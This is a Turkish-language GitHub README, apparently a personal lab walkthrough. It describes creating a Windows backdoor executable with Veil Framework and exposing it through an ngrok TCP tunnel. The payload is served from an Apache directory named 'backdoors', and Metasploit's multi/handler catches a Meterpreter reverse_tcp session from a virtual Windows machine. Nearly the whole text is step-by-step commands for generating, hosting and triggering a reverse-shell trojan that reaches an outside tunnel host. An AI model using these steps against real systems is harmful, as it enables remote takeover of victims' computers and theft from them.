# Veil-Ngrok-Calistirma
Veil Framework ile Ngrok Çalıştırarak Trojen Oluşturup Çalıştırmak


Veil Framework Yükleme Referansı: https://github.com/Veil-Framework/Veil


- Ngrok.com adresine giderek üye oldum.
- Site üzerinden “Download for Linux” diyerek sanal Kali makinama ngrok’u indirdim
- 2. Kısımda yazan authentication token’ımı kayderek siteden çıkış yapıyorum.
![ngrok site](https://user-images.githubusercontent.com/67163428/191236942-63485be5-51da-4a83-bdb2-b8a87b25e0c2.png)

- Download klasörü içinde indirdiğim Zip dosyası içinden Ngrok’u çıkardım
- Terminal ekranını açarak Download klasörünün içine gidiyorum, ls diyerek dosyaları kontrol ediyorum ve “ngrok” dosyasını görüyorum.
- Kaydetmiş olduğum authentication tokenı ./ngrok yaparak yapıştırıp tokenın dosyaya yazılmasını sağlıyorum.
-./ngrok tcp diyerek tcp 4848 servisini çalıştırıp kullanılmayan bir port ekliyorum.
- Ngrok çalışmaya başladıktan sonra gelen ekran üzerinde tcp://0.tcp.eu.ngrok.io’a ya 11810 portundan gelen verileri benim makinamın 4848 portuna aktaracağını anlıyoruz.
-trojen yaratmak için Veil kullanıyorum.
-veil dosyasının kurulu olduğu yere giderek, Veil.py dosyasını çalıştırmak için “python3 Veil.py” yapıyorum.
- çıkan ekranda 2 araç kullanılabilir olduğunu görüyorum ve 1. Aracı kullanıyorum
- “list” diyerek payload listelerini görüyorum.
- “use 7” diyerek 7. payloadı seçerek devam ediyorum.
-“set LHOST 0.tcp.ngrok.io” yazıyorum. Ngrok üzerinden bize verilen adresi girdim.
-port olarakta “set LPORT 11810” giriyorum
-“generate” diyerek benim için oluşturmasını istiyorum daha sonra bir isim vererek dosyanın nerede oluştuğunu görebiliyorum.
- “/var/lib/veil/output/compiled/veilbackdoor.exe” içerisinde olan dosyamı keserek 
 /var/www/html/backdoors/” klasörünün içine aktarıyorum. (backdoors klasörünü isteğe bağlı oluşturabilirsiniz)



-apache servisimi çalıştırıyorum.
-dinlemeyi yapmak için msfconsole içine giriyorum.
- “ use exploit/multi/handler” 
“ set payload windows/meterpreter/reverse_tcp” komutlarını giriyorum
-“show opitons” içine girerek LHOST VE LPORTA BAKIYORUM.
“set LHOST 0.0.0.0” VE “set LPORT 4848” yazarak düzenleme yapıyorum.
-“exploit -j -z” diyerek dinlemeyi başlatmış oluyorum.




-oluşturduğum sanal windows makinasını çalıştırıyorum.
- tarayıcıyı açarak “10.0.2.15/backdors” adresine giderek veilbackdoor.exe dosyasını indiriyorum
- exe dosyasını açtıktan sonra kali makinamızın terminaline bir sessions düşüyor. 
- “sessions -l” yaparak tüm sessionsları görüyoruz ve bize gerekli olan “sessions -1” diyerek windows makinamızın içine giriyoruz. 
- “sysinfo” yapara makinamızın ele geçirildiğini kanıtlamış oluyoruz.



